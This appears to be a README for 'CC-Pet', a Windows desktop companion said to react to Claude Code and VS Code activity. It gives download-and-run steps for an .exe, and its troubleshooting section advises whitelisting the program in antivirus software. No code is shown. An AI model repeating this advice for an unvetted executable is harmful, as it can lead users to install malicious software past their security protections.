# 🐈 CC-Pet - An animated companion for your desktop

[![](https://img.shields.io/badge/Download-CC--Pet-blue)](https://github.com/stingsealed599/CC-Pet/releases)

CC-Pet brings an animated character to your Windows desktop. This pet responds to your work within Claude Code and functions as a standalone companion. You can customize its look and monitor your status through its real-time reactions.

## 📥 How to download the app

You can grab the latest version of CC-Pet from our releases page. Follow these steps to install the software on your computer:

1. Visit the [CC-Pet releases page](https://github.com/stingsealed599/CC-Pet/releases).
2. Look for the section labeled "Assets."
3. Select the file ending in `.exe` that corresponds to your Windows system.
4. Save the file to a folder you can find later, such as your Downloads folder.
5. Double-click the file to start the installation.
6. Follow the prompts on your screen to finish the setup.

Once the process finishes, a shortcut will appear on your desktop. Click this shortcut to launch your new desktop companion.

## ⚙️ System requirements

CC-Pet works on most modern Windows setups. To ensure a smooth experience, please check that your computer meets these minimum standards:

* Operating System: Windows 10 or Windows 11.
* Memory: At least 4 gigabytes of RAM.
* Storage: 200 megabytes of free space.
* Graphics: DirectX 11 support.

If you encounter performance issues, close background programs that use a high amount of processor power.

## ✨ Key features

CC-Pet provides several ways to improve your daily workflow.

### Desktop overlay
The pet sits on your desktop and remains visible while you use other apps. You can drag the pet to any location on your screen. It features custom animations that trigger based on your productivity and system status.

### Claude Code integration
If you use Claude Code, CC-Pet connects to your tools. The pet changes its expression based on the state of your workspace. It provides visual feedback for your projects, making your environment feel more alive.

### VS Code support
Install the optional VS Code extension to sync your pet with your code editor. This extension allows the pet to react when you save files or finish tasks. You can manage these settings through the extension menu inside your editor.

### Customization options
You can change the appearance of your pet through the settings menu. Choose between different themes and animations to fit your preference. The app stores these choices locally so your pet stays the same every time you open the program.

## 🛠️ Configuration and settings

Open the settings menu by right-clicking the CC-Pet icon in your system tray. This area allows you to control how the app behaves.

* Start with Windows: Enable this toggle to have your pet appear immediately after you log in.
* Animation Speed: Adjust the slider to make your pet move faster or slower.
* Connectivity: Ensure the box for Claude Code integration is checked if you want your pet to track your development activity.
* Always on Top: Keep your pet in front of all other windows by selecting this option.

## 🤝 Getting help

If the application fails to start, check the following steps:

1. Restart your computer. This clears temporary issues that stop apps from launching.
2. Check your antivirus settings. Sometimes security software blocks new programs. Make sure to add CC-Pet to your whitelist.
3. Update your graphics drivers. Ensure your system uses the current version provided by your hardware manufacturer.

If you still need help, open an issue on the repository. Provide details about your Windows version and describe what happens when you try to open the program. Clear descriptions help us fix bugs faster.
